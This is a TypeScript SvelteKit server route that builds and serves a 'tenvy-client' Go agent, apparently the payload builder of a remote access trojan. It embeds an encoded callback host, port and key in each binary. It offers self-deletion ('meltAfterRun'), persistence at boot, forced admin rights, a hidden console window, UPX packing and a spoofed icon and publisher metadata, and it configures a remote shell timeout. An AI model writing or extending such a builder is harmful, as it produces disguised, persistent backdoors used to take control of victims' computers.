import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile } from 'node:fs/promises';
import { dirname, join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { spawn } from 'node:child_process';
import type { SpawnOptionsWithoutStdio } from 'node:child_process';
import { randomBytes } from 'node:crypto';

interface BuildRequestBody {
        host: string;
        port?: string | number;
        outputFilename?: string;
        outputExtension?: string;
        targetOS?: string;
        targetArch?: string;
        installationPath?: string;
        meltAfterRun?: boolean;
        startupOnBoot?: boolean;
        developerMode?: boolean;
        pollIntervalMs?: string | number;
        maxBackoffMs?: string | number;
        shellTimeoutSeconds?: string | number;
        mutexName?: string;
        compressBinary?: boolean;
        forceAdmin?: boolean;
        fileIcon?: {
                name?: string | null;
                data?: string | null;
        } | null;
        fileInformation?: Record<string, unknown> | null;
}

interface BuildResponseBody {
        success: boolean;
        message: string;
        outputPath?: string;
        downloadUrl?: string;
        log?: string[];
        sharedSecret?: string;
        warnings?: string[];
}

type TargetOS = 'windows' | 'linux' | 'darwin';

const allowedTargetOS = new Set<TargetOS>(['windows', 'linux', 'darwin']);
const architectureMatrix: Record<TargetOS, Set<string>> = {
        windows: new Set(['amd64', '386', 'arm64']),
        linux: new Set(['amd64', 'arm64']),
        darwin: new Set(['amd64', 'arm64'])
};

const extensionMatrix: Record<TargetOS, string[]> = {
        windows: ['.exe', '.bat'],
        linux: ['.bin'],
        darwin: ['.bin']
};

const mutexSanitizer = /[^A-Za-z0-9._-]/g;
const allowedFileInfoKeys = new Map<string, string>([
        ['fileDescription', 'FileDescription'],
        ['productName', 'ProductName'],
        ['companyName', 'CompanyName'],
        ['productVersion', 'ProductVersion'],
        ['fileVersion', 'FileVersion'],
        ['originalFilename', 'OriginalFilename'],
        ['internalName', 'InternalName'],
        ['legalCopyright', 'LegalCopyright']
]);
const maxVersionComponent = 65535;
const maxMutexLength = 120;
const maxIconBytes = 512 * 1024;

function resolveTargetOS(value?: string): TargetOS {
        if (!value) {
                return 'windows';
        }
        const normalized = value.toLowerCase().trim();
        if (allowedTargetOS.has(normalized as TargetOS)) {
                return normalized as TargetOS;
        }
        return 'windows';
}

function resolveTargetArch(value: string | undefined, targetOS: TargetOS): string {
        const options = architectureMatrix[targetOS] ?? new Set<string>(['amd64']);
        const fallback = Array.from(options)[0] ?? 'amd64';
        if (!value) {
                return fallback;
        }
        const normalized = value.toLowerCase().trim();
        if (options.has(normalized)) {
                return normalized;
        }
        return fallback;
}

function resolveExtension(value: string | undefined, targetOS: TargetOS): string {
        const options = extensionMatrix[targetOS] ?? extensionMatrix.windows;
        if (!value) {
                return options[0];
        }

        const normalized = value.startsWith('.') ? value.toLowerCase() : `.${value.toLowerCase()}`;
        if (options.includes(normalized)) {
                return normalized;
        }

        return options[0];
}

function sanitizeFilename(value: string, extension: string): string {
        const lowerExtension = extension.toLowerCase();
        let base = value;

        if (lowerExtension && base.toLowerCase().endsWith(lowerExtension)) {
                base = base.slice(0, -lowerExtension.length);
        }

        const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/\.+$/, '');
        const safeBase = cleaned.length > 0 ? cleaned : `tenvy-client-${Date.now()}`;

        return `${safeBase}${lowerExtension}`;
}

function sanitizePositiveInteger(
        value: string | number | undefined,
        min: number,
        max: number,
        label: string
): string | null {
        if (value === undefined || value === null) {
                return null;
        }

        const normalized = value.toString().trim();
        if (normalized === '') {
                return null;
        }

        if (!/^\d+$/.test(normalized)) {
                throw error(400, `${label} must be a positive integer.`);
        }

        const parsed = Number.parseInt(normalized, 10);
        if (!Number.isFinite(parsed)) {
                throw error(400, `${label} must be a valid number.`);
        }

        if (parsed < min || parsed > max) {
                throw error(400, `${label} must be between ${min} and ${max}.`);
        }

        return String(parsed);
}

function encodeBase64(value: string): string {
        return Buffer.from(value, 'utf8').toString('base64');
}

function sanitizeMutexName(value: string | undefined): string {
        if (!value) {
                return '';
        }
        const trimmed = value.trim();
        if (!trimmed) {
                return '';
        }
        const sanitized = trimmed.replace(mutexSanitizer, '_');
        return sanitized.slice(0, maxMutexLength);
}

type NormalizedFileInformation = Record<string, string>;

function sanitizeFileInformationPayload(payload: Record<string, unknown> | null | undefined): NormalizedFileInformation {
        if (!payload) {
                return {};
        }
        const normalized: NormalizedFileInformation = {};
        for (const [key, label] of allowedFileInfoKeys.entries()) {
                const raw = payload[key];
                if (typeof raw !== 'string') {
                        continue;
                }
                const trimmed = raw.trim();
                if (!trimmed) {
                        continue;
                }
                normalized[label] = trimmed.slice(0, 256);
        }
        return normalized;
}

function hasFileInformationPayload(payload: NormalizedFileInformation): boolean {
        return Object.keys(payload).length > 0;
}

type VersionParts = { Major: number; Minor: number; Patch: number; Build: number };

function parseVersionParts(value: string | undefined): VersionParts | null {
        if (!value) {
                return null;
        }
        const trimmed = value.trim();
        if (!trimmed) {
                return null;
        }
        const segments = trimmed.split('.').slice(0, 4);
        const numbers: number[] = [];
        for (const segment of segments) {
                const parsed = Number.parseInt(segment, 10);
                if (!Number.isFinite(parsed) || parsed < 0) {
                        numbers.push(0);
                        continue;
                }
                numbers.push(Math.min(parsed, maxVersionComponent));
        }
        while (numbers.length < 4) {
                numbers.push(0);
        }
        return {
                Major: numbers[0] ?? 0,
                Minor: numbers[1] ?? 0,
                Patch: numbers[2] ?? 0,
                Build: numbers[3] ?? 0
        };
}

type NormalizedFileIcon = { filename: string; buffer: Buffer } | null;

function sanitizeIconFilename(name: string | null | undefined): string {
        if (typeof name !== 'string') {
                return 'icon.ico';
        }
        const trimmed = name.trim();
        if (!trimmed) {
                return 'icon.ico';
        }
        const lower = trimmed.toLowerCase();
        if (!lower.endsWith('.ico')) {
                return 'icon.ico';
        }
        const safe = trimmed.replace(mutexSanitizer, '_').slice(0, 64);
        return safe || 'icon.ico';
}

function normalizeFileIcon(payload: BuildRequestBody['fileIcon']): NormalizedFileIcon {
        if (!payload || typeof payload.data !== 'string') {
                return null;
        }
        const trimmed = payload.data.trim();
        if (!trimmed) {
                return null;
        }
        let buffer: Buffer;
        try {
                buffer = Buffer.from(trimmed, 'base64');
        } catch {
                throw error(400, 'Icon payload must be valid base64 data.');
        }
        if (buffer.length === 0) {
                return null;
        }
        if (buffer.length > maxIconBytes) {
                throw error(400, `Icon payload exceeds ${maxIconBytes} bytes.`);
        }
        return {
                filename: sanitizeIconFilename(payload.name ?? null),
                buffer
        };
}

function buildVersionInfoConfig(
        info: NormalizedFileInformation,
        iconFileName: string | null
): Record<string, unknown> {
        const config: Record<string, unknown> = {
                VarFileInfo: {
                        Translation: {
                                LangID: '0409',
                                CharsetID: '04B0'
                        }
                }
        };

        if (iconFileName) {
                config.IconPath = iconFileName;
        }

        if (hasFileInformationPayload(info)) {
                config.StringFileInfo = info;
        }

        const fileVersion = parseVersionParts(info.FileVersion);
        const productVersion = parseVersionParts(info.ProductVersion);

        if (fileVersion || productVersion) {
                config.FixedFileInfo = {
                        FileVersion: fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
                        ProductVersion: productVersion ?? fileVersion ?? { Major: 0, Minor: 0, Patch: 0, Build: 0 },
                        FileFlagsMask: '3f',
                        FileFlags: '00',
                        FileOS: '040004',
                        FileType: '01',
                        FileSubtype: '00'
                } satisfies Record<string, unknown>;
        }

        return config;
}

async function runCommand(
        command: string,
        args: readonly string[],
        options: SpawnOptionsWithoutStdio,
        output: string[]
): Promise<number> {
        return await new Promise((resolveCommand, rejectCommand) => {
                const child = spawn(command, args, options);

                child.stdout?.on('data', (chunk) => {
                        output.push(chunk.toString());
                });

                child.stderr?.on('data', (chunk) => {
                        output.push(chunk.toString());
                });

                child.on('error', rejectCommand);
                child.on('close', (code) => resolveCommand(code ?? 0));
        });
}

async function compressBinaryWithUpx(
        binaryPath: string,
        output: string[],
        warnings: string[]
): Promise<void> {
        try {
                        const exitCode = await runCommand(
                                'upx',
                                ['--best', '--lzma', binaryPath],
                                {
                                        cwd: dirname(binaryPath),
                                        env: process.env,
                                        stdio: ['pipe', 'pipe', 'pipe']
                                },
                                output
                        );
                        if (exitCode !== 0) {
                                warnings.push(`Binary compression exited with code ${exitCode}. Artifact left uncompressed.`);
                        }
        } catch (err) {
                const code = (err as NodeJS.ErrnoException).code;
                if (code === 'ENOENT') {
                        warnings.push('Compression skipped: upx binary is not available in the build environment.');
                        return;
                }
                const message = err instanceof Error ? err.message : 'Unknown compression error.';
                warnings.push(`Compression failed: ${message}`);
        }
}

function generateSharedSecret(): string {
        return randomBytes(32).toString('hex');
}

export const POST: RequestHandler = async ({ request }) => {
        let payload: BuildRequestBody;
        try {
                payload = (await request.json()) as BuildRequestBody;
        } catch (err) {
                throw error(400, 'Invalid build payload');
        }

        const host = payload.host?.toString().trim();
        if (!host) {
                throw error(400, 'Host is required');
        }

        if (/\s/.test(host)) {
                throw error(400, 'Host cannot contain whitespace');
        }

        const port = (payload.port ?? '2332').toString().trim();
        if (!/^\d+$/.test(port)) {
                throw error(400, 'Port must be numeric');
        }

        const developerMode = payload.developerMode !== false;
        const targetOS = resolveTargetOS(payload.targetOS?.toString());
        const targetArch = resolveTargetArch(payload.targetArch?.toString(), targetOS);
        const outputExtension = resolveExtension(payload.outputExtension?.toString().trim(), targetOS);
        const outputFilename = sanitizeFilename(
                (payload.outputFilename ?? 'tenvy-client').toString().trim(),
                outputExtension
        );
        const installationPath = (payload.installationPath ?? '').toString().trim();
        const sharedSecret = generateSharedSecret();
        const meltAfterRun = Boolean(payload.meltAfterRun);
        const startupOnBoot = Boolean(payload.startupOnBoot);
        const mutexName = sanitizeMutexName(
                payload.mutexName !== undefined && payload.mutexName !== null
                        ? String(payload.mutexName)
                        : undefined
        );
        const compressBinary = Boolean(payload.compressBinary);
        const forceAdmin = Boolean(payload.forceAdmin);
        const iconPayload = normalizeFileIcon(payload.fileIcon ?? null);
        const fileInformation = sanitizeFileInformationPayload(payload.fileInformation ?? null);
        const shouldEmbedResources =
                targetOS === 'windows' && (iconPayload !== null || hasFileInformationPayload(fileInformation));

        const pollIntervalMs = sanitizePositiveInteger(payload.pollIntervalMs, 1000, 3_600_000, 'Poll interval');
        const maxBackoffMs = sanitizePositiveInteger(payload.maxBackoffMs, 1000, 86_400_000, 'Max backoff');
        const shellTimeoutSeconds = sanitizePositiveInteger(
                payload.shellTimeoutSeconds,
                5,
                7_200,
                'Shell timeout'
        );

        const repoRoot = resolve(process.cwd(), '..');
        let tempDir: string | null = null;
        const buildOutput: string[] = [];
        const warnings: string[] = [];

        try {
                tempDir = await mkdtemp(join(tmpdir(), 'tenvy-build-'));
                const workDir = join(tempDir, 'src');
                await cp(join(repoRoot, 'tenvy-client'), workDir, { recursive: true });
                const tempBinaryPath = join(tempDir, outputFilename);

                const ldflagsParts = [
                        `-X main.defaultServerHostEncoded=${encodeBase64(host)}`,
                        `-X main.defaultServerPortEncoded=${encodeBase64(port)}`,
                        `-X main.defaultInstallPathEncoded=${encodeBase64(installationPath)}`,
                        `-X main.defaultEncryptionKeyEncoded=${encodeBase64(sharedSecret)}`,
                        `-X main.defaultMeltAfterRun=${meltAfterRun ? 'true' : 'false'}`,
                        `-X main.defaultStartupOnBoot=${startupOnBoot ? 'true' : 'false'}`,
                        `-X main.defaultMutexKeyEncoded=${encodeBase64(mutexName)}`,
                        `-X main.defaultForceAdminRequirement=${forceAdmin ? 'true' : 'false'}`
                ];

                if (pollIntervalMs) {
                        ldflagsParts.push(`-X main.defaultPollIntervalOverrideMs=${pollIntervalMs}`);
                }
                if (maxBackoffMs) {
                        ldflagsParts.push(`-X main.defaultMaxBackoffOverrideMs=${maxBackoffMs}`);
                }
                if (shellTimeoutSeconds) {
                        ldflagsParts.push(`-X main.defaultShellTimeoutOverrideSecs=${shellTimeoutSeconds}`);
                }
                if (compressBinary) {
                        ldflagsParts.push('-s -w');
                }

                if (!developerMode && targetOS === 'windows') {
                        ldflagsParts.push('-H=windowsgui');
                }

                if (shouldEmbedResources) {
                        const cmdDir = join(workDir, 'cmd');
                        const iconFileName = iconPayload?.filename ?? null;
                        const versionConfig = buildVersionInfoConfig(fileInformation, iconFileName);
                        await writeFile(
                                join(cmdDir, 'versioninfo.json'),
                                `${JSON.stringify(versionConfig, null, 2)}\n`,
                                'utf8'
                        );
                        if (iconPayload) {
                                await writeFile(join(cmdDir, iconPayload.filename), iconPayload.buffer);
                        }
                        const goversionArgs = [
                                'run',
                                'github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0',
                                '-64'
                        ] as const;
                        const goversionExit = await runCommand(
                                'go',
                                goversionArgs,
                                {
                                        cwd: cmdDir,
                                        env: process.env,
                                        stdio: ['pipe', 'pipe', 'pipe']
                                },
                                buildOutput
                        );
                        if (goversionExit !== 0) {
                                warnings.push(
                                        `Embedding Windows resources failed with exit code ${goversionExit}. Continuing without version metadata.`
                                );
                        }
                }

                const ldflags = ldflagsParts.join(' ');

                const goArgs = ['build', '-ldflags', ldflags, '-o', tempBinaryPath, './cmd'] as const;
                const goEnv = {
                        ...process.env,
                        GOOS: targetOS,
                        GOARCH: targetArch,
                        CGO_ENABLED: '0'
                } satisfies NodeJS.ProcessEnv;

                const exitCode = await runCommand(
                        'go',
                        goArgs,
                        {
                                cwd: workDir,
                                env: goEnv,
                                stdio: ['pipe', 'pipe', 'pipe']
                        },
                        buildOutput
                );

                if (exitCode !== 0) {
                        const logLines = buildOutput.join('').split(/\r?\n/).filter((line) => line.trim().length > 0);
                        const response: BuildResponseBody = {
                                success: false,
                                message: `go build failed with exit code ${exitCode}`,
                                log: logLines,
                                warnings
                        };
                        return json(response, { status: 200 });
                }

                if (compressBinary) {
                        await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
                }

                const logLines = buildOutput.join('').split(/\r?\n/).filter((line) => line.trim().length > 0);

                const buildsDir = join(repoRoot, 'tenvy-server', 'static', 'builds');
                await mkdir(buildsDir, { recursive: true });
                const finalPath = join(buildsDir, outputFilename);

                await copyFile(tempBinaryPath, finalPath);
                await chmod(finalPath, 0o755);

                const response: BuildResponseBody = {
                        success: true,
                        message: 'Agent built successfully',
                        outputPath: finalPath,
                        downloadUrl: `/builds/${encodeURIComponent(outputFilename)}`,
                        log: logLines,
                        sharedSecret,
                        warnings
                };

                return json(response);
        } catch (err) {
                const captured = buildOutput.join('').split(/\r?\n/).filter((line) => line.trim().length > 0);

                if (err instanceof Error && (err as NodeJS.ErrnoException).code === 'ENOENT') {
                        return json(
                                {
                                        success: false,
                                        message: 'Go compiler is not available in the build environment.',
                                        log: captured,
                                        warnings
                                },
                                { status: 200 }
                        );
                }

                const message = err instanceof Error ? err.message : 'Failed to build agent';
                return json(
                        {
                                success: false,
                                message,
                                log: captured,
                                warnings
                        },
                        { status: 200 }
                );
        } finally {
                if (tempDir) {
                        await rm(tempDir, { recursive: true, force: true });
                }
        }
};
